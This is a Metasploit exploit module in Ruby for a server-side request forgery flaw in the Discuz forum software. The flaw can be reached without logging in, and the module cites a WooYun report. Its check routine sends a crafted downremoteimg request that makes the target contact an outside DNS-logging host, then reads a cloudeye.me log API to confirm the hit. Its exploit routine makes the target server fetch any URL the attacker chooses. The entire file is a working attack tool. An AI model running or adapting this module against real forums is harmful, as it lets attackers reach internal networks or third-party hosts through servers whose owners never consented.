require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking
  include Msf::Exploit::Remote::HttpClient
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'discuz 一处SSRF',
      'Description'    => %q{
        discuz 一处SSRF无须登陆无须条件.验证模块采用cloudeye，日志可能无法及时返回,可通过访问
    http://cloudeye.me/api/53d982ebd47dbede467832a14e4ded1e/fyzs/ApacheLog/    手动查看
      },
      'Author'         => 
          [ 
		'tyomcat', 
	],
      'License'        => BSD_LICENSE,
      'References'     => 
      	[ 
		['url','http://www.wooyun.org/bugs/wooyun-2011-0151179']
	],
      'Privileged'     => true,
      'Platform'       => ['php'],
      'Targets'        => [ ['Automatic', { }], ],
      'Arch'           => ARCH_PHP,
      'DefaultTarget'  => 0 ,
      ))
    register_options(
      [
        OptString.new('RRHOST', [ true,  "The URI OF TARGET TO REQUEST", '']),
		Opt::RHOST(),
		Opt::RPORT(80),
		OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
		OptString.new('DoCheck', [ true, "Do Check The PayLoad", 'YES']),
      ], self.class)
  end

  def check
    timeout = 3
    response = send_request_raw({ 'uri' => "/forum.php"},timeout)
    if response.code == 200
      if docheck == 'YES'
        rand_uri = rand_text_numeric(5 + rand(8))
	print_status(rand_uri)
        payLoad = "/#{targeturi}/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://fyzs.00212f.dnslog.info/#{rand_uri}%231.jpg[/img]"
    	send_request_raw({ 'uri' => payLoad},timeout)
	cloudeye_respone = send_request_raw({'rhost' => 'cloudeye.me', 'uri' => '/api/53d982ebd47dbede467832a14e4ded1e/fyzs/ApacheLog/'},timeout)
	if cloudeye_respone
	  cloudeye_log = cloudeye_respone.body.scan(/(\[.*#{rand_uri}.*)HTTP/).first
	  if cloudeye_log
	    print_good("#{rhost} cloud be exploit ^_^ ")
	    print_good("cloudeye log as :")
	    print_good("#{cloudeye_log}")
	    return Exploit::CheckCode::Vulnerable
	  end
	else
	  fail_with(Failure::Unknown,"cannot connect to cloudeye,please retry without check module")	  
	end
      end
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    timeout = 3
    if check == Exploit::CheckCode::Vulnerable
      payLoad = "/#{targeturi}/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]#{rrhost}%231.jpg[/img]"
      response = send_request_raw({ 'uri' => payLoad},timeout)
      print_good("finshed exploit ")
    end
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end
   
  def rrhost
    datastore['RRHOST']
  end

  def docheck
    datastore['DoCheck']
  end

  def targeturi
    datastore['TARGETURI']
  end

end
